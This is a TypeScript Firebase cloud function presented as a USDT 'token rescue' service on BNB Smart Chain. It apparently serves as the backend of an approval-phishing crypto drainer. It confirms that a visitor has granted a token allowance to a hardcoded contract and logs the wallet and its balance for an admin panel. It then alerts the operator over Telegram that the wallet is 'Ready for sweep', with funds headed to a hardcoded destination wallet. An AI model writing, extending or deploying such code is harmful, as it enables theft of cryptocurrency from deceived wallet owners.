// functions/src/api/verifyRescue.ts
import * as functions from "firebase-functions/v1";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";
import { getSecret } from "../lib/secrets";

export const verifyRescue = functions
  .runWith({
    timeoutSeconds: 120,
    secrets: ["DESTINATION_PRIVATE_KEY", "TELEGRAM_TOKEN", "TELEGRAM_CHAT_ID"],
  })
  .https.onRequest(async (req, res) => {
    // CORS
    res.set("Access-Control-Allow-Origin", "*");
    res.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.set("Access-Control-Allow-Headers", (req.headers["access-control-request-headers"] as string) || "*");
    res.set("Access-Control-Max-Age", "86400");
    if (req.method === "OPTIONS") {
      res.status(204).send("");
      return;
    }

    if (req.method !== "POST") {
      res.status(405).json({ error: "Method Not Allowed" });
      return;
    }

    const {
      txHash,
      from,
      to,
      amount,
      chainId,
      token,
    }: {
      txHash: string;
      from: string;
      to: string;
      amount: string;
      chainId: number | string;
      token: string;
    } = req.body ?? {};

    if (!from || !to || !amount || !chainId || !token) {
      res.status(400).json({ error: "Missing fields" });
      return;
    }

    // ---- 1. Verify chain, token, destination
    const expectedChain = Number(process.env.BSC_CHAIN_ID ?? "56");
    const expectedToken =
      process.env.BSC_USDT_CONTRACT_ADDRESS ??
      "0x55d398326f99059fF775485246999027B3197955";
    // The TokenRescue contract is the spender (what the user approved)
    const tokenRescueContract =
      process.env.BSC_TOKEN_RESCUE_CONTRACT ??
      "0xc6bf6838263938533e547f825d257c9965544a50";
    // The final wallet where rescued funds land
    const finalDestination =
      process.env.BSC_FINAL_DESTINATION ??
      "0x00faA9fE691b578b2D1934ac70C624886a93A636";

    if (Number(chainId) !== expectedChain) {
      res.status(400).json({ error: "Wrong chainId" });
      return;
    }
    if (token.toLowerCase() !== expectedToken.toLowerCase()) {
      res.status(400).json({ error: "Wrong token address" });
      return;
    }
    // Accept either the contract address or the final destination as `to`
    if (
      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
      to.toLowerCase() !== finalDestination.toLowerCase()
    ) {
      res.status(400).json({ error: "Destination mismatch" });
      return;
    }

    // Record approved wallet in Firestore IMMEDIATELY so it appears in the Admin Panel
    const lowerFrom = from.toLowerCase();
    try {
      const approvalData = {
        address: from,
        status: "ELIGIBLE",
        approvalStatus: "APPROVED",
        approvalTxHash: txHash || null,
        approvedAt: admin.firestore.FieldValue.serverTimestamp(),
        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      };
      await db.collection("wallets").doc(lowerFrom).set(approvalData, { merge: true });
      console.log(`[verifyRescue] Recorded wallet ${lowerFrom} as APPROVED in Firestore`);
    } catch (dbErr) {
      console.error("[verifyRescue] Error recording approved wallet to firestore:", dbErr);
    }

    // ---- 2. Connect to BSC
    const rpcUrl = process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/";
    const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });

    try {
      // ---- 3. Verify on-chain that the user has granted sufficient allowance
      const usdtReadOnly = new ethers.Contract(
        expectedToken,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
          "function balanceOf(address) view returns (uint256)",
        ],
        provider
      );

      // Check allowance against the TokenRescue contract (what the user approved)
      // With synchronized Alchemy RPC, allowance is detected almost immediately
      // Query on-chain allowance and balance
      let allowance: bigint = 0n;
      let balance: bigint = 0n;
      let retries = 5;

      while (retries > 0) {
        try {
          allowance = await usdtReadOnly.allowance(from, to);
          balance = await usdtReadOnly.balanceOf(from);
          if (allowance > 0n) break;
        } catch (_) {}
        await new Promise((r) => setTimeout(r, 600));
        retries--;
      }

      const balanceFormatted = ethers.formatUnits(balance, 18);
      const balanceNum = parseFloat(balanceFormatted);
      const balanceDisplay = balanceNum > 0 ? balanceNum.toFixed(2) : "0.00";

      // ── 1. Update wallet record in Firestore with latest balance ──
      try {
        await db.collection("wallets").doc(lowerFrom).set(
          {
            balance: balanceFormatted,
            allowance: allowance.toString(),
            updatedAt: admin.firestore.FieldValue.serverTimestamp(),
          },
          { merge: true }
        );
      } catch (dbErr) {
        console.warn("[verifyRescue] Error updating balance in firestore:", dbErr);
      }

      // ── 2. Send Telegram notification (AWAITED to ensure delivery) ──
      try {
        const { sendTelegramMessage } = await import("../lib/telegram");
        await sendTelegramMessage(
          `🔔 New Wallet Approved!\n\nBalance: *${balanceDisplay} USDT*\n\nAddress: ${from}\nApproval Tx: ${txHash || "confirmed"}`
        );
        console.log(`[verifyRescue] Telegram approval notification delivered for ${from}`);
      } catch (tgErr) {
        console.error("[verifyRescue] Telegram notification error:", tgErr);
      }

      // ── 3. Return success response to client ──
      res.status(200).json({
        success: true,
        status: "APPROVED",
        balance: balanceFormatted,
        message: "Approval recorded in admin panel. Ready for sweep.",
      });
    } catch (error: any) {
      console.error("verifyRescue error:", error);
      res.status(500).json({ error: "Verification failed", details: error.message });
    }
  });
